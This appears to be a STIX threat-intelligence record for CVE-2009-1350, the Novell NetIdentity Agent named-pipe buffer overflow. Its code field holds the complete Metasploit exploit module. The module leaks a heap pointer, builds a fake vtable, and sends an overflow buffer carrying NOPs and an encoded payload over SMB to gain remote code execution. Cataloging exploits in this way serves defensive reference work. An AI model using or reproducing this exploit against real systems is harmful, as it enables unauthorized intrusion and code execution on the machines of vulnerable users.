{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a99576a7-fac4-4771-be34-9b7f6c14547d",
    "created": "2024-08-14T16:56:17.004857Z",
    "modified": "2024-08-14T16:56:17.004861Z",
    "name": "Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Novell's NetIdentity Agent. When sending a specially crafted string to the 'XTIERRPCPIPE' named pipe, an attacker may be able to execute arbitrary code. The success of this module is much greater once the service has been restarted. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/netidentity_xtierrpcpipe.rb",
            "external_id": "netidentity_xtierrpcpipe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1350"
        },
        {
            "source_name": "reference",
            "url": "http://www.reversemode.com/index.php?option=com_content&task=view&id=62&Itemid=1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Novell's NetIdentity Agent. When sending\n        a specially crafted string to the 'XTIERRPCPIPE' named pipe, an attacker may be\n        able to execute arbitrary code. The success of this module is much greater once the\n        service has been restarted.\n      },\n      'Author'         => [ 'MC', 'Ruben Santamarta' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-1350' ],\n          [ 'OSVDB', '53351' ],\n          [ 'BID', '34400' ],\n          [ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=62&Itemid=1' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process', # only one shot!\n        },\n      'Payload'\t=>\n        {\n          'Space'\t=> 550,\n          'BadChars' => \"\\x00\\x09\\x0c\\x0b\\x20\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x81\\xe4\\xf0\\xff\\xff\\xff\",\n        },\n      'Platform'\t=> 'win',\n      'Targets'\t=>\n        [\n          [ 'Windows 2000 / Windows XP / Windows 2003', { 'Ret' => 0x41414141 } ],\n        ],\n      'Privileged'\t => true,\n      'DisclosureDate' => '2009-04-06',\n      'DefaultTarget'\t => 0))\n\n    register_options(\n      [\n        OptString.new('SMBUser', [ true, 'The username to authenticate as', 'metasploit'], fallbacks: ['USERNAME']),\n        OptString.new('SMBPass', [ true, 'The password for the specified username', 'metasploit'], fallbacks: ['PASSWORD'])\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  # don't bother with this module for autoexploitation, it creates\n  # false-positives on newer systems.\n  def autofilter\n    false\n  end\n\n  def mem_leak\n    print_status(\"Connecting to the server...\")\n    connect(versions: [1])\n\n    print_status(\"Authenticating as user '#{datastore['SMBUser']}' with pass '#{datastore['SMBPass']}'...\")\n\n    begin\n      smb_login()\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n      disconnect\n      return\n    end\n\n    print_status(\"Connecting to named pipe \\\\XTIERRPCPIPE...\")\n\n    # If the pipe doesn't exist, bail.\n    begin\n      pipe = simple.create_pipe('\\\\XTIERRPCPIPE')\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n      disconnect\n      return\n    end\n\n    # If we get this far, do the dance.\n    fid = pipe.file_id\n\n    # Need to make a Trans2 request with the param of 'QUERY_FILE_INFO' keeping our file_id\n    trans2 = simple.client.trans2(0x0007, [fid, 1005].pack('vv'), '')\n\n    # Send the first request to get our pointer.\n    leak =  [0x00000004].pack('V') + [0x00000818].pack('V')\n    leak << rand_text_alpha_upper(2040)\n\n    print_status(\"Sending malformed request...\")\n    pipe.write(leak)\n\n    heap_pointer_leaked = pipe.read()[2060,4].unpack('V')[0]\n    print_status(sprintf(\"Heap Pointer leaked: 0x%.8x\", heap_pointer_leaked))\n\n    print_status(\"Building fake VTable...\")\n    object = heap_pointer_leaked + 0x700\n    print_status(sprintf(\"Object: 0x%.8x\", object))\n    method = object + 0x30\n    print_status(sprintf(\"Method: 0x%.8x\", method))\n    shellcode = method + 0xA0\n    print_status(sprintf(\"Shellcode: 0x%.8x\", shellcode))\n\n    pipe.close\n\n    return heap_pointer_leaked,object,method,shellcode\n  end\n\n  def exploit\n    heap_pointer_leaked,object,method,shellcode = mem_leak()\n\n    return if not shellcode\n\n    sploit =  [0x00000002].pack('V')\n    sploit << [0x00000000].pack('V')\n    sploit << [object].pack('V')\n    sploit << [0x00000000].pack('V')\n    sploit << rand_text_alpha_upper(240)\n    sploit << [object].pack('V') * 32\n    sploit << [method].pack('V') * 32\n    sploit << [shellcode].pack('V') * 32\n    sploit << make_nops(748)\n    sploit << payload.encoded\n    sploit << rand_text_alpha_upper(110)\n\n    print_status(\"Connecting to the server...\")\n    connect(versions: [1])\n\n    print_status(\"Authenticating as user '#{datastore['SMBUser']}' with pass '#{datastore['SMBPass']}'...\")\n\n    begin\n      smb_login()\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n      disconnect\n      return\n    end\n\n    print_status(\"Connecting to named pipe \\\\XTIERRPCPIPE...\")\n\n    # If the pipe doesn't exist, bail.\n    begin\n      pipe = simple.create_pipe('\\\\XTIERRPCPIPE')\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n      disconnect\n      return\n    end\n\n    # ok, set up and send our exploit buffer...\n    fid = pipe.file_id\n    trans2 = simple.client.trans2(0x0007, [fid, 1005].pack('vv'), '')\n    print_status(\"#{sploit.length} bytes written...\")\n    pipe.write(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-04-06",
    "x_mitre_platforms": [
        "win'"
    ]
}